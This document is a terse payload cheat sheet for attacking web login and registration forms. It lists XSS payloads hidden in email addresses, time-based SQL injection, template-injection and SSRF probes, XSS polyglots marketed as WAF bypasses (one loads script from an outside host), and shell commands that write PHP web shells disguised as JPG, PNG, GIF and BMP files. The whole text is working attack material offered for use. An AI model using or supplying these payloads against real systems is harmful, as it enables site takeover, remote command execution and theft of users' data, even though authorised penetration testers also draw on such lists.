Login and register payloads:

- valid Email payloads:
1. test+(<script>alert(0)</script>)@example.com
2. test@example(<script>alert(0)</script>).com
3. "<script>alert(0)</script>"@example.com


Sql injection:
(select(0)from(select(sleep(25)))v) --> Blind 25 seconds
/0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z/ --> Time based 10 seconds



SSTI template injection:
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

SSRF:
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
-------------------------
html injection(Can use match and replace in request body):
<u>123</u>


-------------
XSS:

https://netsec.expert/posts/xss-in-2021/

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

%3c<aa+ONLOAD+href=javasONLOADcript:promptONLOAD(1)%3e --> WAF BYPASS
<img src onerror=alt=''+document.domain> '  --> WAF Bypass

xss payload --> xss.xml:

<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>

Double quote and single quote bypass:
<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>

'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//zaggeb.xSs.ht></scripT>
------
RCE payload to creating image:
echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg

echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png

echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif

echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp